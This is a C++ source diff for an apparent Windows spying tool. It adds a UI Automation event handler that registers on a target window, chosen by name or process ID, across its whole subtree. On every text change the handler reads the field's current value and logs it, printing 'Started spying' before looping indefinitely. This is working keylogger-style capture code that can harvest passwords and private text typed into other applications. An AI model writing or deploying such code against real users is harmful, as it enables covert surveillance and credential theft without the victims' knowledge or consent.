@@ -38,25 +38,39 @@ HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::QueryInterface(REFIID riid, 
 	return S_OK;
 }
 
-HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::HandleAutomationEvent(IUIAutomationElement* pSender, EVENTID eventID)
+HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::HandleAutomationEvent(IUIAutomationElement* pAutomationElement, EVENTID eventID)
 {
-	BSTR name;
-	HRESULT res = pSender->get_CurrentName(&name);
-	if (FAILED(res))
+	HRESULT hr;
+	switch (eventID)
 	{
-		return ERROR_ACCESS_DENIED;
+		case UIA_Text_TextChangedEventId:
+		{
+			VARIANT vVar;
+			VariantInit(&vVar);
+
+			hr = pAutomationElement->GetCurrentPropertyValue(UIA_ValueValuePropertyId, &vVar);
+			if (SUCCEEDED(hr))
+			{
+				Log(vVar.bstrVal, EMPTY);
+			}
+			break;
+		}
+
+	default:
+		break;
 	}
-	std::wstring wname(name, SysStringLen(name));
-	std::wcout << L"[+] Event from window: " << wname << std::endl;
+	return ERROR_SUCCESS;
 }
 
 HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::Deploy(wchar_t* windowName, DWORD pid)
 {
 	CComPtr<IUIAutomation> pAutomation;
 	CComPtr<IUIAutomationElement> pAutomationElement;
+	MyAutomationEventHandler* pMyAutomationEventHandler = new MyAutomationEventHandler();
+
 	HRESULT hr;
 	BSTR bName;
-	
+
 	hr = CoCreateInstance(__uuidof(CUIAutomation), NULL, CLSCTX_INPROC_SERVER, __uuidof(IUIAutomation), (void**)&pAutomation);
 	if (FAILED(hr))
 	{
@@ -76,7 +90,8 @@ HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::Deploy(wchar_t* windowName, 
 		}
 
 		Log(L"Spying " + std::wstring(windowName), DBG);
-	} else if (pid != 0)
+	}
+	else if (pid != 0)
 	{
 		pAutomationElement = Finder::GetUIAElementByPID(pAutomation, pid);
 		if (pAutomationElement == NULL)
@@ -95,13 +110,24 @@ HRESULT STDMETHODCALLTYPE MyAutomationEventHandler::Deploy(wchar_t* windowName, 
 	}
 
 	hr = pAutomationElement->get_CurrentName(&bName);
-	
+
 	if (SUCCEEDED(hr))
 	{
 		std::wstring wname(bName, SysStringLen(bName));
 		Log(L"Window Name: " + wname, INFO);
 	}
 
+	hr = pAutomation->AddAutomationEventHandler(UIA_Text_TextChangedEventId, pAutomationElement, TreeScope_Subtree, NULL, (IUIAutomationEventHandler*)pMyAutomationEventHandler);
+	if (FAILED(hr))
+	{
+		Log(L"pAutomation->AddAutomationEventHandler() Failed", WARNING);
+		PrintErrorFromHRESULT(hr);
+		return 1;
+	}
+
+	Log(L"Started spying", INFO);
+
+	while (1) {}
 
 	return 0;
 }
